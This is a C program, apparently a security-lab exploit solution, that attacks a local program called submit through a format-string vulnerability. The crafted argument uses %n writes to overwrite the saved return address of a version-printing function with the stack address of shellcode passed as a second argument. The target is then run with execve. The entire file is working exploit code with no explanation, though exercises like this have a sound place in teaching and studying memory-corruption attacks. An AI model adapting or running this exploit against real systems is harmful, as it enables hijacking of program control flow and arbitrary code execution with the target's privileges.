#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include "shellcode.h"

int main(void) {
  char *args[4], *env[1];
  int load_size = 140 - strlen("Submission program version 0.1 (") + 4;

  args[0] = (char*) malloc(load_size + 1);
  // eip for print_version is saved at 0xffbfddac
  // need to write shellcode stored at 0xffbfdfb8 to the eip
  // 0xb8 ==> 124
  // 0xdf ==> 039
  // 0xbf ==> 224
  // 0xff ==> 064
  strcpy(args[0], "\xac\xdd\xbf\xff.AAA\xad\xdd\xbf\xff.AAA\xae\xdd\xbf\xff.AAA\xaf\xdd\xbf\xff%124x%15$n%039x%17$n%224x%19$n%064x%21$n");

  args[1] = "-v";
  args[2] = shellcode;
  args[3] = NULL;

  env[0] = NULL;

  return execve("/usr/local/bin/submit", args, env);
}
